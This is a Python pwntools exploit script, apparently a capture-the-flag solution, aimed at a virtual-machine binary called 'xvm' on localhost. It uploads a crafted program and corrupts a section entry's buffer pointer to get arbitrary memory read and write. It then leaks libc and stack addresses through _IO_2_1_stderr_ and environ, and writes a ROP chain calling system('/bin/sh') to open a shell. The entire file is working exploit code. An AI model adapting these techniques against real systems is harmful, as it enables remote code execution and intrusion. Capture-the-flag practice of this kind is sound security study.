import pwn
import ctypes
import struct
import time


class SectionEntry(ctypes.Structure):
    _fields_ = [
        ("m_name", ctypes.c_uint64),  # still a pointer
        ("m_buff", ctypes.c_uint64),  # now a raw uint64
        ("v_size", ctypes.c_uint32),
        ("v_addr", ctypes.c_uint32),
        ("a_size", ctypes.c_uint32),
        ("m_flag", ctypes.c_uint32),
        ("m_ofst", ctypes.c_uint32),
        ("next", ctypes.c_uint64),  # now a raw uint64
    ]

    @classmethod
    def sizeof(cls) -> int:
        """Total size, in bytes, of the on-disk struct layout."""
        return ctypes.sizeof(cls)

    @classmethod
    def from_bytes(cls, data: bytes) -> "SectionEntry":
        """Parse a single struct from exactly sizeof() bytes."""
        size = cls.sizeof()
        if len(data) < size:
            raise ValueError(f"Need {size} bytes, got {len(data)}")
        return cls.from_buffer_copy(data)

    def to_bytes(self) -> bytes:
        """
        Serialize this struct into its on-the-wire layout:
          char*    m_name;   (ptr)
          uint64   m_buff;   (raw 8-byte value)
          uint32   v_size;
          uint32   v_addr;
          uint32   a_size;
          uint32   m_flag;
          uint32   m_ofst;
          uint64   next;     (raw 8-byte value)
        """
        # little-endian: Q=8-byte, I=4-byte
        fmt = "<Q Q I I I I I Q"

        # pointer‐to‐integer for m_name
        name_addr = self.m_name or 0

        # raw uint64 fields
        buff_val = self.m_buff or 0
        next_val = self.next or 0

        packed = struct.pack(
            fmt,
            name_addr,
            buff_val,
            self.v_size,
            self.v_addr,
            self.a_size,
            self.m_flag,
            self.m_ofst,
            next_val,
        )
        return packed


exe = pwn.ELF("./xvm")
libc = pwn.ELF("./libc.so.6")

p = pwn.remote("localhost", 7777)

with open("./pwn.xvm", "rb") as fp:
    payload = fp.read()

p.sendlineafter(b"> ", b"1")
p.sendlineafter(b": ", b"%d" % len(payload))
p.sendafter(b": ", payload)
p.recvuntil(b"Token: ")
token = p.recvline().strip()
p.sendlineafter(b"> ", b"2")
p.sendlineafter(b": ", token)
entry = SectionEntry.from_bytes(p.recv(0x50)[0x20:])
buff_addr = entry.m_buff
libc_ptr = buff_addr - 0x6398
entry.m_buff = libc_ptr
p.send(b"\x00" * 0x20 + entry.to_bytes())

libc.address = pwn.u64(p.recv(8)) - libc.symbols["_IO_2_1_stderr_"]
pwn.info("libc: 0x%x" % libc.address)

entry.m_buff = libc.symbols["environ"]
p.send(b"\x00" * 0x20 + entry.to_bytes())

environ = pwn.u64(p.recv(8))
rip = environ - 0x158

pwn.info("RIP: 0x%x" % rip)

entry.m_buff = rip
p.send(b"\x00" * 0x20 + entry.to_bytes())


pwn.context.arch = "amd64"
rop = pwn.ROP(libc)
rop.raw(rop.ret)
rop.call(libc.symbols["system"], [next(libc.search(b"/bin/sh\x00"))])
p.sendline(rop.chain())


p.interactive()
